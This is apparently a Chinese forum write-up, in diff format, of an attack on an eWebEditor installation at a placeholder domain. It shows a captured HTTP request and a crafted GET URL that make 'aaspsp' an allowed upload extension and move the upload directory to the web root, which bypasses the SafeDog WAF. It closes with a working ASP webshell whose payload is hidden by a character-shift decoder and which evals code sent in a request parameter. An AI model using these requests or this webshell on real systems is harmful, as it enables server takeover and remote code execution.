@@ -1,0 +1,79 @@
+抓了下包，得到如下数据预览源代码打印关于01 [url]http://xxxx.com/system/eWebEditor/admin_style.asp?action=StyleSetSave&id=50[/url]  
+
+02    
+
+03 POST /system/eWebEditor/admin_style.asp?action=StyleSetSave&id=50 HTTP/1.1  
+
+04 Host: xxxx.com  
+
+05 User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0  
+
+06 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
+
+07 Accept-Language: en-US,en;q=0.5  
+
+08 Accept-Encoding: gzip, deflate  
+
+09 Connection: keep-alive  
+
+10 Referer: [url]http://xxxx.com/system/eWebEditor/admin_style.asp?action=styleset&id=50[/url]  
+
+11 Cookie: ASPSESSIONIDSABCQBBT=KHLJMNEAEKNNMGAMJAFHCPOK  
+
+12 Content-Type: application/x-www-form-urlencoded  
+
+13 Content-Length: 740  
+
+14 d_name=standard1&d_initmode=EDIT&d_uploadobject=0&d_autodir=0&d_dir=standard&d_css=office&d_width=550&d_height=350&d_stateflag=1&d_detectfromword=true&d_autoremote=1&d_showborder=0&d_baseurl=1&d_uploaddir=UploadFile%2F&d_basehref=&d_contentpath=&d_imageext=gif%7Cjpg%7Cjpeg%7Cbmp%7C%3Basa.ass%3B.jpg&d_imagesize=500&d_flashext=swf&d_flashsize=100&d_mediaext=rm%7Cmp3%7Cwav%7Cmid%7Cmidi%7Cra%7Cavi%7Cmpg%7Cmpeg%7Casf%7Casx%7Cwma%7Cmov&d_mediasize=100&d_fileext=rar%7Czip%7Cexe%7Cdoc%7Cxls%7Cchm%7Chlp&d_filesize=500&d_remoteext=gif%7Cjpg%7Cjpeg%7Cbmp&d_remotesize=100&d_memo=Office%B1%EA%D7%BC%B7%E7%B8%F1%A3%AC%B2%BF%B7%D6%B3%A3%D3%C3%B0%B4%C5%A5%A3%AC%B1%EA%D7%BC%CA%CA%BA%CF%BD%E7%C3%E6%BF%ED%B6%C8%A3%AC%C4%AC%C8%CF%D1%F9%CA%BD&x=42&y=11 
+于是使用构造get提交方式：预览源代码打印关于1 [url]http://xxxx.com/system/eWebEditor/admin_style.asp?action=StyleSetSave&id=50&d_name=standard1&d_initmode=EDIT&d_uploadobject=0&d_autodir=0&d_dir=standard&d_css=office&d_width=550&d_height=350&d_stateflag=1&d_detectfromword=true&d_autoremote=1&d_showborder=0&d_baseurl=1&d_uploaddir=%2F&d_basehref=&d_contentpath=&d_imageext=gif%7Cjpg%7Cjpeg%7Cbmp%7Casaspp%7Ccer%7cASA&d_imagesize=500&d_flashext=swf&d_flashsize=100&d_mediaext=rm%7Cmp3%7Cwav%7Cmid%7Cmidi%7Cra%7Cavi%7Cmpg%7Cmpeg%7Casf%7Casx%7Cwma%7Cmov&d_mediasize=100&d_fileext=rar%7Czip%7Cexe%7Cdoc%7Cxls%7Cchm%7Chlp&d_filesize=500&d_remoteext=gif%7Cjpg%7Cjpeg%7Cbmp&d_remotesize=100&d_memo=Office%B1%EA%D7%BC%B7%E7%B8%F1%A3%AC%B2%BF%B7%D6%B3%A3%D3%C3%B0%B4%C5%A5%A3%AC%B1%EA%D7%BC%CA%CA%BA%CF%BD%E7%C3%E6%BF%ED%B6%C8%A3%AC%C4%AC%C8%CF%D1%F9%CA%BD&x=42&y=11[/url]  
+
+然后直接访问时，他显示是提交成功了，实际上也米有成功，需要我们先访问：
+http://xxxx.com/system/eWebEdito ... =styleset&id=50
+    然后在在地址栏中输入上边的get提交数据，就会显示成功。
+    这儿我们可以修改样式了，但是安全狗作怪使得asa、cer和asp;jpg等等的修改都无效，但是aaspsp这样的修改绕过去了安全狗，这儿可能是程序天然给我们的一个绕安全狗的方法吧！程序本身使用的代码有问题，他会替换aaspsp中完整的asp部分为空格使得剩下的部分还是asp，这儿的代码依旧是一个替换函数，就不多说了，前辈们已经写了很多了。就是这样的一个代码写法使得我们天然绕过了安全狗上传asp的文件了，重这里我们也可以得到启发，以后我们绕安全狗是不是也可以使用这样的代码写法去绕过，话不多说，留下余香。
+    接下来我曾填好了可以传的后缀asp，但是视乎目录有问题，以前默认的目录是uploadfiles这个文件目录，视乎是做了限制，于是我想到了修改上传文件目录，当然你可以仔细看我上边构造的哪个get提交上边的d_uploaddir属性的值是%2F,也就是一个/,于是我传上去的文件在根目录下。
+    当然这儿已经为我们上传做好了所有铺垫了，我们现在只需要一个可以绕过安全狗的马就ok了。
+    还记得以前解密一个asp木马的时候，里面有一个后门，当时只是以为那个是一个后门，但是后面有心人测试发现这个后门很是了得可以绕过护卫神，今天我又用它绕过了安全狗。
+
+
+<%     
+
+codeds="Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li"   
+
+execute (decode (codeds) )     
+
+Function DeCode (Coded)     
+
+On Error Resume Next   
+
+For i = 1 To Len (Coded)     
+
+Curchar = Mid (Coded, i, 1)     
+
+If Asc (Curchar) = 16 then     
+
+Curchar = chr (8)     
+
+Elseif Asc (Curchar) = 24 then     
+
+Curchar = chr (12)     
+
+Elseif Asc (Curchar) = 32 then     
+
+Curchar = chr (18)     
+
+Else     
+
+Curchar = chr (Asc (Curchar) -3)     
+
+End if     
+
+DeCode = Decode&Curchar     
+
+Next   
+
+End Function   
+
+'response.write(decode(codeds))     
+
+%>   
